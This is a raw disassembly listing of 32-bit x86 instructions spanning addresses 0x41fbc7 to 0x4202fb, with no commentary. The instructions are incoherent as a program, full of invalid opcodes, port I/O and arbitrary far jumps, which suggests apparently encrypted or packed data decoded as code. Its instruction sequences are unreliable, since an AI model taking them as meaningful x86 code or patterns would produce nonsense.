  41fbc7:	sub    bh,al
  41fbc9:	inc    edx
  41fbca:	mov    WORD PTR [edi],ss
  41fbcc:	in     eax,0xd6
  41fbce:	in     eax,0xc7
  41fbd0:	xchg   BYTE PTR [ecx-0x2f],ah
  41fbd3:	lods   eax,DWORD PTR ds:[esi]
  41fbd4:	pop    ss
  41fbd5:	jl     0x41fbec
  41fbd7:	dec    ebp
  41fbd8:	jae    0x41fb77
  41fbda:	adc    cl,BYTE PTR [edi+0x2a]
  41fbdd:	or     ch,BYTE PTR [ebx+ebx*4-0x28]
  41fbe1:	xchg   edx,eax
  41fbe2:	xchg   ebx,eax
  41fbe3:	arpl   ax,di
  41fbe5:	fs call 0x4741:0xaacae21f
  41fbed:	pusha  
  41fbee:	jmp    0x41fbff
  41fbf0:	dec    edx
  41fbf1:	pusha  
  41fbf2:	mov    ebx,0x3bd36589
  41fbf7:	xchg   ebp,eax
  41fbf8:	push   ecx
  41fbf9:	cmp    eax,0x472324ef
  41fbfe:	xor    eax,0xf1557410
  41fc03:	xchg   esi,eax
  41fc04:	aam    0xe5
  41fc06:	les    eax,FWORD PTR [ebx+0x7e]
  41fc09:	mov    esp,DWORD PTR [ecx+esi*4-0x53]
  41fc0d:	xor    edi,DWORD PTR [edx]
  41fc0f:	js     0x41fc36
  41fc11:	push   eax
  41fc12:	js     0x41fc8e
  41fc14:	adc    esp,esi
  41fc16:	cwde   
  41fc17:	enter  0xf3ea,0x87
  41fc1b:	scas   al,BYTE PTR es:[edi]
  41fc1c:	retf   
  41fc1d:	pop    es
  41fc1e:	pop    ebx
  41fc1f:	xchg   esi,edx
  41fc21:	fnstenv [ecx]
  41fc23:	pop    ebx
  41fc24:	mov    cl,0xb0
  41fc26:	out    0xcc,eax
  41fc28:	in     eax,0x5e
  41fc2a:	add    eax,0xf39a8108
  41fc2f:	pop    es
  41fc30:	adc    BYTE PTR [ebp-0x2],dl
  41fc33:	mov    cs,WORD PTR [esi+0x74572a5e]
  41fc39:	xchg   DWORD PTR [ebx+0x5a90bf74],ebp
  41fc3f:	inc    ebx
  41fc40:	push   ds
  41fc41:	mov    edx,DWORD PTR [esi+0x8]
  41fc44:	pop    esp
  41fc45:	mov    edx,0xcc7bff14
  41fc4a:	out    0xd,eax
  41fc4c:	lods   al,BYTE PTR ds:[esi]
  41fc4d:	cwde   
  41fc4e:	stos   BYTE PTR es:[edi],al
  41fc4f:	(bad)  
  41fc50:	popf   
  41fc51:	(bad)  
  41fc52:	sub    DWORD PTR [edx+ebp*8],ebp
  41fc55:	loope  0x41fc11
  41fc57:	retf   
  41fc58:	stc    
  41fc59:	shl    eax,0x50
  41fc5c:	out    0x8f,eax
  41fc5e:	sub    esp,DWORD PTR [ecx]
  41fc60:	mov    al,ds:0x7d34f45c
  41fc65:	xchg   ecx,eax
  41fc66:	leave  
  41fc67:	xor    al,0x7a
  41fc69:	int    0xfb
  41fc6b:	js     0x41fc78
  41fc6d:	aaa    
  41fc6e:	cs push ebp
  41fc70:	jbe    0x41fc90
  41fc72:	cmp    bl,BYTE PTR [edx]
  41fc74:	jl     0x41fc9c
  41fc76:	out    0x73,eax
  41fc78:	xlat   BYTE PTR ds:[ebx]
  41fc79:	pop    ds
  41fc7a:	jmp    0x495f60ad
  41fc7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc80:	mov    al,ah
  41fc82:	test   al,0x13
  41fc84:	sahf   
  41fc85:	outs   dx,BYTE PTR ds:[esi]
  41fc86:	mov    ds:0xfe28c373,eax
  41fc8b:	dec    ebp
  41fc8c:	mov    eax,ds:0xac77f504
  41fc91:	xor    DWORD PTR es:[edx-0x5a0ff4ac],ecx
  41fc98:	mov    ds:0x466f924f,eax
  41fc9d:	add    eax,0xd6628355
  41fca2:	xor    eax,0xba94a6ae
  41fca7:	adc    ch,BYTE PTR [eax-0x6d12dc39]
  41fcad:	adc    BYTE PTR [ecx-0x5aed2f99],ah
  41fcb3:	xor    DWORD PTR [edi],eax
  41fcb5:	call   0xbf06bca4
  41fcba:	xchg   ecx,eax
  41fcbc:	push   ecx
  41fcbd:	pop    ecx
  41fcbe:	int3   
  41fcbf:	jmp    0xf02e:0x136e5fd8
  41fcc6:	rol    ebx,cl
  41fcc8:	pop    esi
  41fcc9:	and    ecx,DWORD PTR [edx]
  41fccb:	push   esp
  41fccc:	shl    BYTE PTR ds:0x4da4283b,cl
  41fcd2:	(bad)  
  41fcd3:	cmp    BYTE PTR [ecx+0xe],dh
  41fcd6:	js     0x41fd38
  41fcd8:	daa    
  41fcd9:	and    DWORD PTR [ecx],ebp
  41fcdb:	ins    DWORD PTR es:[edi],dx
  41fcdc:	jbe    0x41fc7d
  41fcde:	pop    ebp
  41fcdf:	mov    al,0xb0
  41fce1:	xchg   DWORD PTR [ebx],eax
  41fce3:	bound  eax,QWORD PTR ds:0x6cedae05
  41fce9:	les    edi,FWORD PTR [edx-0x4a]
  41fcec:	stos   DWORD PTR es:[edi],eax
  41fced:	je     0x41fcf9
  41fcef:	sub    al,0xb7
  41fcf1:	shr    DWORD PTR [eax+0x7ddd4a03],1
  41fcf7:	xchg   ebp,eax
  41fcf8:	xor    DWORD PTR [ebp+0x74],edi
  41fcfb:	jns    0x41fd1c
  41fcfd:	sahf   
  41fcfe:	pop    esp
  41fcff:	aad    0x57
  41fd01:	mov    al,ds:0x580b8adf
  41fd06:	sahf   
  41fd07:	push   0x4
  41fd09:	cwde   
  41fd0a:	lahf   
  41fd0b:	es mov ebp,ecx
  41fd0e:	add    al,0x9d
  41fd10:	pop    esi
  41fd11:	mov    ds:0xd74330fb,al
  41fd16:	imul   esi,esi,0xb168123
  41fd1c:	cmp    eax,0xfa373284
  41fd21:	icebp  
  41fd22:	xor    esi,ebx
  41fd24:	stos   BYTE PTR es:[edi],al
  41fd25:	cmc    
  41fd26:	outs   dx,DWORD PTR ds:[esi]
  41fd27:	inc    BYTE PTR [eax]
  41fd29:	stos   BYTE PTR es:[edi],al
  41fd2a:	arpl   WORD PTR [edx],cx
  41fd2c:	leave  
  41fd2d:	push   ds
  41fd2e:	repz cdq 
  41fd30:	or     edx,esi
  41fd32:	test   eax,0x83f87487
  41fd37:	sbb    DWORD PTR [ebx-0x50f10285],eax
  41fd3d:	test   ebp,0x59c5519f
  41fd43:	push   cs
  41fd44:	add    bl,BYTE PTR [esi]
  41fd46:	sub    al,0xc8
  41fd48:	push   edi
  41fd49:	loopne 0x41fd6f
  41fd4b:	iret   
  41fd4c:	cdq    
  41fd4d:	cs push cs
  41fd4f:	loope  0x41fd0e
  41fd51:	stc    
  41fd52:	pop    ecx
  41fd53:	outs   dx,DWORD PTR ds:[esi]
  41fd54:	jmp    0xf526fabf
  41fd59:	inc    ax
  41fd5b:	test   DWORD PTR ss:[ebp+ecx*2+0x5bc2d873],ecx
  41fd63:	cmp    dh,BYTE PTR [edi+0x16a9a852]
  41fd69:	in     al,dx
  41fd6a:	imul   edx,DWORD PTR ds:0x4a427121,0xc2645218
  41fd74:	add    BYTE PTR [ecx-0x284ea3b3],al
  41fd7a:	mov    cl,bl
  41fd7c:	mov    bh,0x2b
  41fd7e:	jae    0x41fdad
  41fd80:	xor    dh,al
  41fd82:	pop    ebx
  41fd83:	repnz fucomp st(0)
  41fd86:	outs   dx,DWORD PTR ds:[esi]
  41fd87:	dec    esi
  41fd88:	js     0x41fdd3
  41fd8a:	rcl    BYTE PTR [edi+eax*8+0x6c],cl
  41fd8e:	pushf  
  41fd8f:	and    dh,BYTE PTR [edi]
  41fd91:	xchg   esp,eax
  41fd92:	mov    WORD PTR [edx+0x4818e662],?
  41fd98:	ss icebp 
  41fd9a:	mov    eax,0x9304f873
  41fd9f:	lahf   
  41fda0:	jmp    0x41fdc8
  41fda2:	push   ecx
  41fda3:	add    DWORD PTR [edi-0x40],ebx
  41fda6:	or     eax,0x27228f1a
  41fdab:	and    ch,dh
  41fdad:	mov    dh,0x84
  41fdaf:	mov    esi,0xc7662e5d
  41fdb4:	lahf   
  41fdb5:	aaa    
  41fdb6:	lahf   
  41fdb7:	and    DWORD PTR [eax-0x1a],esi
  41fdba:	popf   
  41fdbb:	ret    
  41fdbc:	jb     0x41fd98
  41fdbe:	xchg   BYTE PTR [ecx+0xa],bh
  41fdc1:	sbb    DWORD PTR [ebx],ebx
  41fdc3:	or     DWORD PTR [edx],edx
  41fdc5:	sub    al,0xd8
  41fdc7:	aam    0x6c
  41fdc9:	sub    ch,BYTE PTR [ebp-0xebbd454]
  41fdcf:	cmp    DWORD PTR [esi+0x78],edx
  41fdd2:	loop   0x41fda5
  41fdd4:	mov    cl,0xa9
  41fdd6:	inc    ebp
  41fdd7:	cmp    eax,0xd0aeb5e
  41fddc:	dec    ebx
  41fddd:	repz pop edi
  41fddf:	sahf   
  41fde0:	inc    ebp
  41fde1:	(bad)  
  41fde2:	pop    esi
  41fde3:	push   edi
  41fde4:	pop    ds
  41fde5:	fdivr  QWORD PTR ds:0xc0a07ee0
  41fdeb:	mov    eax,DWORD PTR [ebp-0x7c]
  41fdee:	mov    al,BYTE PTR [ebx-0x75]
  41fdf1:	ret    0xb1b4
  41fdf4:	xchg   DWORD PTR [ebp-0x4e],esi
  41fdf7:	cwde   
  41fdf8:	lods   eax,DWORD PTR ds:[esi]
  41fdf9:	cs jns 0x41fd9c
  41fdfc:	mov    ch,0xbf
  41fdfe:	mov    cl,0x88
  41fe00:	std    
  41fe01:	xor    al,0x57
  41fe03:	push   edx
  41fe04:	bnd jo 0x41fda6
  41fe07:	test   al,0x8b
  41fe09:	ret    
  41fe0a:	inc    ebx
  41fe0b:	iret   
  41fe0c:	rcr    DWORD PTR [edx+0x5c],1
  41fe0f:	jne    0x41fe78
  41fe11:	mov    cl,0x3
  41fe13:	int    0xe
  41fe15:	scas   al,BYTE PTR es:[edi]
  41fe16:	dec    ecx
  41fe17:	push   edx
  41fe18:	push   0x3577b78b
  41fe1d:	xchg   DWORD PTR [eax+ebp*8+0x19],edi
  41fe21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe22:	cmp    al,0x7a
  41fe24:	leave  
  41fe25:	pop    esp
  41fe26:	popa   
  41fe27:	jno    0x41fe1d
  41fe29:	fdivrp st(3),st
  41fe2b:	out    dx,al
  41fe2c:	xchg   edi,eax
  41fe2d:	shr    BYTE PTR [edi-0x13b35610],cl
  41fe33:	loopne 0x41fdfc
  41fe35:	int    0xfe
  41fe37:	dec    esi
  41fe38:	daa    
  41fe39:	sar    DWORD PTR [ebx],cl
  41fe3b:	and    ecx,ebx
  41fe3d:	add    DWORD PTR [ebx],ebp
  41fe3f:	cli    
  41fe40:	inc    ecx
  41fe41:	std    
  41fe42:	inc    ebx
  41fe43:	fstp   QWORD PTR [edx+esi*8]
  41fe46:	jp     0x41fe93
  41fe48:	xchg   ebp,eax
  41fe49:	pop    edi
  41fe4a:	and    ah,dh
  41fe4c:	dec    esi
  41fe4d:	push   0x3a
  41fe4f:	addr16 enter 0x2719,0xde
  41fe54:	sub    ecx,edx
  41fe56:	mov    ebp,0x55c8322
  41fe5b:	sar    edx,0x41
  41fe5e:	(bad)  
  41fe5f:	fbld   TBYTE PTR [ebx-0x42]
  41fe62:	dec    ecx
  41fe63:	ror    BYTE PTR [esi+0x7e],cl
  41fe66:	int3   
  41fe67:	sub    al,0xa2
  41fe69:	stc    
  41fe6a:	mov    dh,0x4
  41fe6c:	dec    ebx
  41fe6d:	pop    ebx
  41fe6e:	adc    DWORD PTR [eax],ebp
  41fe70:	add    eax,0xa5f79a09
  41fe75:	inc    edx
  41fe76:	(bad)  
  41fe77:	vmread DWORD PTR [ebx-0x1bf5a581],edi
  41fe7e:	int    0xc5
  41fe80:	inc    esi
  41fe81:	fsub   DWORD PTR fs:[ebx]
  41fe84:	xchg   edx,eax
  41fe85:	mov    ds:0x2aed2021,eax
  41fe8a:	pop    ebp
  41fe8b:	mov    edi,0xe3647008
  41fe90:	pop    ds
  41fe91:	imul   BYTE PTR ds:0x15023a03
  41fe97:	mov    ebp,0x18e75b54
  41fe9c:	sub    al,0x6f
  41fe9e:	sbb    BYTE PTR [esi-0x38],cl
  41fea1:	push   ss
  41fea2:	jae    0x41fe86
  41fea4:	pop    ss
  41fea5:	cmp    DWORD PTR [ecx+ecx*8+0x5c],edx
  41fea9:	xor    eax,0xafb27b67
  41feae:	fld    QWORD PTR [edi-0x2d]
  41feb1:	jo     0x41fed8
  41feb3:	dec    eax
  41feb4:	loop   0x41ff02
  41feb6:	xrelease mov DWORD PTR ds:[edi-0x49],esp
  41febb:	push   ss
  41febc:	es jg  0x41ff02
  41febf:	mov    eax,fs:0x4e26779e
  41fec5:	shl    bl,cl
  41fec7:	ror    BYTE PTR [ebx+0x2139bdb9],0xc3
  41fece:	inc    esp
  41fecf:	imul   ah
  41fed1:	and    al,0xea
  41fed3:	inc    esp
  41fed4:	aas    
  41fed5:	sbb    DWORD PTR [esi+0x15],0x3e
  41fed9:	mov    WORD PTR [edx],es
  41fedb:	push   edx
  41fedc:	loop   0x41fe87
  41fede:	pop    edi
  41fedf:	or     al,cl
  41fee1:	rol    DWORD PTR [ecx],0x7b
  41fee4:	dec    BYTE PTR [eax]
  41fee6:	add    cl,bh
  41fee8:	rol    DWORD PTR [edx+0x41],1
  41feeb:	fwait
  41feec:	sub    DWORD PTR [ebp+0x37],0x7f
  41fef0:	inc    esp
  41fef1:	xor    edi,DWORD PTR [esi-0x64]
  41fef4:	outs   dx,DWORD PTR ds:[esi]
  41fef5:	jae    0x41fe93
  41fef7:	shl    esi,cl
  41fef9:	repnz (bad) 
  41fefc:	push   ebx
  41fefd:	std    
  41fefe:	arpl   WORD PTR [ebx-0x5c],si
  41ff01:	jle    0x41ff7c
  41ff03:	(bad)  
  41ff04:	sti    
  41ff05:	lods   eax,DWORD PTR ds:[esi]
  41ff06:	iret   
  41ff07:	sbb    ch,ah
  41ff09:	cmc    
  41ff0a:	(bad)  
  41ff0b:	mov    cl,0x20
  41ff0d:	push   edi
  41ff0e:	jno    0x41ff55
  41ff10:	mov    DWORD PTR [edi],ebp
  41ff12:	out    0xd9,al
  41ff14:	std    
  41ff15:	ficomp WORD PTR [edx]
  41ff17:	mov    gs:0x74fd8161,eax
  41ff1d:	dec    edi
  41ff1e:	dec    BYTE PTR [ebx+0x18]
  41ff21:	rcr    DWORD PTR [edi-0x7c0fcbc7],1
  41ff27:	sub    eax,0x887b4bf2
  41ff2c:	mov    dl,0xef
  41ff2e:	pushf  
  41ff2f:	rcr    BYTE PTR [eax-0x3a],0xfe
  41ff33:	int    0xa
  41ff35:	add    al,0x1d
  41ff37:	loop   0x41feed
  41ff39:	pop    ebx
  41ff3a:	push   esp
  41ff3b:	cmp    BYTE PTR [edx-0x4e021018],ch
  41ff41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff42:	xchg   esi,eax
  41ff43:	cmp    DWORD PTR [ebx-0x44],ecx
  41ff46:	push   ebp
  41ff47:	gs jb  0x41fef4
  41ff4a:	inc    edx
  41ff4b:	inc    ebx
  41ff4c:	adc    bh,BYTE PTR [edx]
  41ff4e:	ds scas eax,DWORD PTR es:[edi]
  41ff50:	xchg   edi,edx
  41ff52:	inc    esp
  41ff53:	jl     0x41ff68
  41ff55:	rol    eax,cl
  41ff57:	std    
  41ff58:	xchg   esi,eax
  41ff59:	cmp    BYTE PTR [ebp-0x56],dh
  41ff5c:	cli    
  41ff5d:	imul   esi
  41ff5f:	in     eax,dx
  41ff60:	jb     0x41ff53
  41ff62:	add    DWORD PTR [ebx+0x302772bd],0xffffffd2
  41ff69:	(bad)  
  41ff6a:	dec    esi
  41ff6b:	js     0x41ff82
  41ff6d:	mov    cl,0x7
  41ff6f:	pop    es
  41ff70:	and    ebp,DWORD PTR [esi-0x27039e4d]
  41ff76:	adc    ebp,esi
  41ff78:	push   ds
  41ff79:	sbb    esi,DWORD PTR [eax-0x50]
  41ff7c:	sar    DWORD PTR [ebp-0x14],cl
  41ff7f:	jle    0x41ff5a
  41ff81:	mov    edx,0x88e141b8
  41ff86:	xor    DWORD PTR [esi+ebp*2],edi
  41ff89:	adc    edi,DWORD PTR [esi+0xf]
  41ff8c:	lods   eax,DWORD PTR ds:[esi]
  41ff8d:	jge    0x41ffed
  41ff8f:	inc    edx
  41ff90:	jbe    0x41ff26
  41ff92:	lds    esi,FWORD PTR [esp+eax*2-0x419c24c2]
  41ff99:	out    dx,al
  41ff9a:	mov    ebx,0xdc2aa75
  41ff9f:	popf   
  41ffa0:	push   edx
  41ffa1:	jle    0x41ffc8
  41ffa3:	test   DWORD PTR [ebp-0x2d],0x6eed6aa3
  41ffaa:	sar    DWORD PTR [ebx-0x67],1
  41ffad:	not    esp
  41ffaf:	mov    ah,0xf8
  41ffb1:	bound  ebx,QWORD PTR [edi+ebx*2-0x58]
  41ffb5:	stos   DWORD PTR es:[edi],eax
  41ffb6:	retf   
  41ffb7:	sub    ebp,edx
  41ffb9:	repz ror BYTE PTR [ebp+0x27],0x1e
  41ffbe:	xchg   edi,eax
  41ffbf:	popf   
  41ffc0:	mov    esi,0xd0776b79
  41ffc5:	xlat   BYTE PTR ds:[ebx]
  41ffc6:	cmp    eax,0x6f5bdb8f
  41ffcb:	mov    al,0x58
  41ffcd:	sbb    edi,DWORD PTR [edi-0x32]
  41ffd0:	int3   
  41ffd1:	test   BYTE PTR [esi],bh
  41ffd3:	inc    ebp
  41ffd4:	adc    BYTE PTR [edx-0x2],bl
  41ffd7:	xor    bh,BYTE PTR [eax]
  41ffd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffda:	rol    DWORD PTR [edi],0x6f
  41ffdd:	jbe    0x42003c
  41ffdf:	inc    bx
  41ffe1:	mov    eax,ds:0xad5cca37
  41ffe6:	jp     0x41ffef
  41ffe8:	add    bh,dh
  41ffea:	jmp    0xda87:0xb1aac947
  41fff1:	out    0x87,eax
  41fff3:	daa    
  41fff4:	jmp    FWORD PTR [esi+eiz*4]
  41fff7:	mov    cl,0xb6
  41fff9:	mov    ah,0xb5
  41fffb:	mov    cl,0xa9
  41fffd:	or     DWORD PTR [edx+eiz*1+0x16],0xec3d2e8f
  420005:	jl     0x420056
  420007:	sub    al,0x9e
  420009:	loop   0x41ffea
  42000b:	hlt    
  42000c:	mov    ch,0x47
  42000e:	mov    ecx,0x47fdf69f
  420013:	fnstsw WORD PTR [edi]
  420015:	sti    
  420016:	and    eax,0xe40a9c4a
  42001b:	fnstenv [edi]
  42001d:	dec    edi
  42001e:	pop    ebp
  42001f:	pop    edi
  420020:	xchg   esi,eax
  420021:	out    dx,eax
  420022:	int3   
  420023:	adc    ebx,ebx
  420025:	div    DWORD PTR ds:0x20d0cfde
  42002b:	xor    al,0x0
  42002d:	aam    0x3b
  42002f:	popa   
  420030:	mov    edx,0xbcf687f2
  420035:	or     DWORD PTR [ebx-0x1bc8a173],0xffffffba
  42003c:	jnp    0x42009d
  42003e:	lock fs mov dh,ah
  420042:	cli    
  420043:	cld    
  420044:	ins    DWORD PTR es:[edi],dx
  420045:	sub    eax,0x1eed3013
  42004a:	sub    bl,ch
  42004c:	dec    ebp
  42004d:	xchg   ebp,eax
  42004e:	jle    0x4200c3
  420050:	ss in  eax,0xce
  420053:	jp     0x4200aa
  420055:	ret    
  420056:	or     BYTE PTR [edx+0x6c],cl
  420059:	inc    edi
  42005a:	mov    al,0x79
  42005c:	lods   eax,DWORD PTR ds:[esi]
  42005d:	sar    BYTE PTR [ecx-0x7091dc04],0x60
  420064:	jne    0x420065
  420066:	jbe    0x4200cb
  420068:	loopne 0x4200e6
  42006a:	in     al,0xd7
  42006c:	loop   0x420039
  42006e:	jl     0x4200af
  420070:	push   0x10463e6d
  420075:	(bad)
  420079:	int    0xd6
  42007b:	pop    edx
  42007c:	sahf   
  42007d:	mov    ah,0x8d
  42007f:	scas   al,BYTE PTR es:[edi]
  420080:	sar    BYTE PTR [ebx],0xd6
  420083:	mov    ecx,0x272f8b53
  420088:	inc    ebx
  420089:	sbb    esi,ebp
  42008b:	add    DWORD PTR [ebx-0x2ca8afd3],esi
  420091:	clc    
  420092:	sahf   
  420093:	outs   dx,BYTE PTR ds:[esi]
  420094:	pop    esi
  420095:	test   al,0x92
  420097:	scas   al,BYTE PTR es:[edi]
  420098:	and    al,0x4b
  42009a:	(bad)  
  42009b:	ficomp WORD PTR [ebx-0x5a227b87]
  4200a1:	mov    al,ds:0xcb0a4455
  4200a6:	inc    edx
  4200a7:	lahf   
  4200a8:	packsswb mm1,QWORD PTR [eax]
  4200ab:	add    ecx,esi
  4200ad:	push   cs
  4200ae:	push   edi
  4200af:	sbb    dh,BYTE PTR [edi+esi*1]
  4200b2:	fisttp WORD PTR [eax]
  4200b4:	ins    DWORD PTR es:[edi],dx
  4200b5:	add    BYTE PTR [esi-0x5b],bh
  4200b8:	cmp    eax,0xa22ab1a2
  4200bd:	push   edi
  4200be:	push   esp
  4200bf:	dec    ecx
  4200c0:	mov    ch,BYTE PTR [esi+0x38]
  4200c3:	jnp    0x420082
  4200c5:	jns    0x4200c6
  4200c7:	dec    edi
  4200c8:	sbb    eax,DWORD PTR ds:0xb37e3d6f
  4200ce:	sahf   
  4200cf:	mov    bh,0xe5
  4200d1:	dec    ebx
  4200d2:	stos   BYTE PTR es:[edi],al
  4200d3:	jecxz  0x420101
  4200d5:	(bad)  
  4200d6:	mul    esp
  4200d8:	(bad)  
  4200d9:	xor    eax,0xf7a10a5a
  4200de:	pop    esi
  4200df:	mov    ds:0x66adf0ce,eax
  4200e4:	dec    ecx
  4200e5:	std    
  4200e6:	hlt    
  4200e7:	bound  ebx,QWORD PTR [edx-0x47aafdef]
  4200ed:	inc    ebp
  4200ee:	add    al,BYTE PTR [eax-0x2fd67225]
  4200f4:	inc    edx
  4200f5:	mov    edi,0x39f20dd3
  4200fa:	mov    BYTE PTR [esi+0xa],cl
  4200fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200fe:	dec    ebp
  4200ff:	jns    0x420164
  420101:	retf   
  420102:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420103:	jo     0x4200c9
  420105:	bound  edx,QWORD PTR [eax+ebp*4+0x69]
  420109:	std    
  42010a:	push   eax
  42010b:	jbe    0x420122
  42010d:	lods   eax,DWORD PTR ds:[esi]
  42010e:	mov    DWORD PTR [ebx-0x656d52ef],edi
  420114:	sub    esi,DWORD PTR [edi-0x62]
  420117:	stc    
  420118:	jb     0x420168
  42011a:	and    al,0xe4
  42011c:	sub    edx,DWORD PTR [edi-0x9]
  42011f:	pop    es
  420120:	pop    es
  420121:	int3   
  420122:	aad    0x8f
  420124:	cld    
  420125:	inc    esi
  420126:	fisubr WORD PTR [ebx+0x6e]
  420129:	cmp    bl,0xe5
  42012c:	jle    0x420197
  42012e:	inc    eax
  42012f:	pop    eax
  420130:	int3   
  420131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420132:	sub    al,0x5c
  420134:	xlat   BYTE PTR ds:[ebx]
  420135:	aas    
  420136:	fld    st(2)
  420138:	in     eax,dx
  420139:	xor    BYTE PTR [edx-0x1f],0xad
  42013d:	sbb    al,0x1a
  42013f:	adc    edx,DWORD PTR [ebx]
  420141:	in     eax,dx
  420142:	adc    bl,BYTE PTR [edx-0x2ab9426e]
  420148:	sbb    eax,ebx
  42014a:	lahf   
  42014b:	pop    ss
  42014c:	adc    dh,BYTE PTR [ebx+eax*4+0x11711017]
  420153:	jl     0x420177
  420155:	daa    
  420156:	in     eax,0x0
  420158:	or     DWORD PTR [ebx+0x1b64c952],edx
  42015e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42015f:	lea    ebp,ds:0x5a247a11
  420165:	pushf  
  420166:	mov    BYTE PTR [ecx+0xa],0x70
  42016a:	pop    ss
  42016b:	into   
  42016c:	and    al,BYTE PTR [eax-0x10c5f3af]
  420172:	dec    ebp
  420173:	xchg   BYTE PTR [eax+0x1a],bh
  420176:	or     dl,0xf5
  420179:	bound  esi,QWORD PTR [edx+0xd]
  42017c:	icebp  
  42017d:	or     cl,0x57
  420180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420181:	inc    edx
  420182:	(bad)  
  420183:	fidiv  DWORD PTR [ebx+edi*2]
  420186:	pop    edi
  420187:	add    al,0x91
  420189:	mov    ecx,0x9e0a3d99
  42018e:	stos   BYTE PTR es:[edi],al
  42018f:	cmp    eax,0xaec930e7
  420194:	leave  
  420195:	sbb    al,0xe4
  420197:	ficom  DWORD PTR [eax-0xb3b9021]
  42019d:	(bad)
  4201a1:	add    al,0x45
  4201a3:	mov    bh,0x93
  4201a5:	rcl    eax,cl
  4201a7:	and    edx,DWORD PTR gs:[eax-0x74]
  4201ab:	xchg   BYTE PTR [eax+0x47],cl
  4201ae:	call   0x78b1:0x68408cca
  4201b5:	ins    DWORD PTR es:[edi],dx
  4201b6:	scas   eax,DWORD PTR es:[edi]
  4201b7:	nop
  4201b8:	ja     0x42016f
  4201ba:	rol    DWORD PTR [edx+0x67],0x1
  4201be:	rcr    DWORD PTR [edi+0x5d],0x0
  4201c2:	push   edi
  4201c3:	out    dx,al
  4201c4:	gs xchg ebp,eax
  4201c6:	(bad)  
  4201c7:	lods   al,BYTE PTR ds:[esi]
  4201c8:	arpl   bx,bp
  4201ca:	mov    ds:0x771ec5aa,al
  4201cf:	lahf   
  4201d0:	dec    ebp
  4201d1:	xor    ecx,0x28
  4201d4:	push   edi
  4201d5:	(bad)  
  4201d7:	sub    DWORD PTR es:[ebp+ebp*8+0x2917f08a],0xffffffcf
  4201e0:	jge    0x4201f7
  4201e2:	fadd   QWORD PTR [edi]
  4201e4:	mov    eax,ds:0xebeeb882
  4201e9:	add    dl,BYTE PTR [ebx-0x60]
  4201ec:	sub    eax,DWORD PTR [esi]
  4201ee:	fstp   QWORD PTR [ebp+0x6a]
  4201f1:	xlat   BYTE PTR ds:[ebx]
  4201f2:	in     al,dx
  4201f3:	mov    bl,0x46
  4201f5:	les    edi,FWORD PTR [edx+0x48ead707]
  4201fb:	scas   al,BYTE PTR es:[edi]
  4201fc:	mov    dh,0xa0
  4201fe:	mov    ?,WORD PTR [edi]
  420200:	mov    ebp,0xd28f954b
  420205:	lock dec eax
  420207:	jp     0x4201b1
  420209:	in     eax,0x7e
  42020b:	iret   
  42020c:	mov    dl,0x30
  42020e:	sti    
  42020f:	mov    ds:0xf32b59f4,al
  420214:	inc    ebp
  420215:	pop    eax
  420216:	sbb    esi,DWORD PTR [esi+eiz*4+0x66]
  42021a:	adc    BYTE PTR ds:0x24d5da13,cl
  420220:	scas   al,BYTE PTR es:[edi]
  420221:	or     eax,0xce85b2d7
  420226:	retf   0xfc42
  420229:	shl    DWORD PTR [eax+0x4538e8f0],1
  42022f:	pop    ss
  420230:	jmp    0xe63e:0x7a3554da
  420237:	adc    bh,BYTE PTR [ebp+0x51]
  42023a:	mov    edi,0x3ea4005f
  42023f:	pop    edi
  420240:	mov    eax,0xf51e06bb
  420245:	dec    ecx
  420246:	inc    ebp
  420247:	dec    eax
  420248:	push   0xffffff8b
  42024a:	aam    0x91
  42024c:	sub    DWORD PTR ss:[ecx-0x37],esi
  420250:	xchg   esp,eax
  420251:	lahf   
  420252:	xor    BYTE PTR [ebx],0x16
  420255:	pop    edx
  420256:	fbstp  TBYTE PTR [esi]
  420258:	mov    bl,0xdc
  42025a:	enter  0xeb33,0x58
  42025e:	add    BYTE PTR [eax+0x37a99604],bl
  420264:	xchg   edx,eax
  420265:	imul   ebp,DWORD PTR [edi-0x3f],0x71f1d75d
  42026c:	xchg   BYTE PTR [ebp+0x7839759c],bl
  420272:	imul   ebp,DWORD PTR [edx+0x33],0xb265d1e1
  420279:	add    al,0xed
  42027b:	pop    edx
  42027c:	mov    bl,0xf1
  42027e:	mov    bl,0x40
  420280:	fpatan 
  420282:	mov    bl,0xa3
  420284:	fs xchg bp,ax
  420287:	gs dec edi
  420289:	push   es
  42028a:	inc    esp
  42028b:	mov    ebx,0x7399ce2a
  420290:	sbb    bh,bl
  420292:	jns    0x420267
  420294:	cmp    DWORD PTR [esi],0x2ecc11ef
  42029a:	neg    BYTE PTR [edx+eax*2]
  42029d:	jb     0x42022e
  42029f:	jmp    0xed11f9aa
  4202a4:	test   BYTE PTR [eax+eiz*1-0x3a8a3b47],dl
  4202ab:	xchg   ebp,eax
  4202ac:	outs   dx,BYTE PTR ss:[esi]
  4202ae:	xchg   BYTE PTR [esp+ebx*8-0x9],cl
  4202b2:	adc    BYTE PTR [ecx-0x565d2950],bl
  4202b8:	imul   eax,DWORD PTR [edx+0x9e56d09],0xffffffdf
  4202bf:	daa    
  4202c0:	pushf  
  4202c1:	mov    ecx,0xa0bc9be9
  4202c6:	add    eax,0xb1bfaee3
  4202cb:	push   esp
  4202cc:	inc    ebp
  4202cd:	outs   dx,BYTE PTR ds:[esi]
  4202ce:	scas   al,BYTE PTR es:[edi]
  4202cf:	xchg   esp,eax
  4202d0:	leave  
  4202d1:	cdq    
  4202d2:	add    DWORD PTR [ebx-0x5e91d025],edx
  4202d8:	xor    al,0x91
  4202da:	fst    st(7)
  4202dc:	scas   eax,DWORD PTR es:[edi]
  4202dd:	fnsave [esi+0xf]
  4202e0:	fwait
  4202e1:	cwde   
  4202e2:	mov    ebx,DWORD PTR [esi-0x1c]
  4202e5:	pop    eax
  4202e6:	leave  
  4202e7:	dec    edi
  4202e8:	sbb    DWORD PTR [ebx+0x9409f],edx
  4202ee:	test   eax,0x3e94c5b3
  4202f3:	pop    ds
  4202f4:	add    al,0xcb
  4202f6:	aam    0x16
  4202f8:	inc    ecx
  4202f9:	int    0x4c
  4202fb:	(bad)  
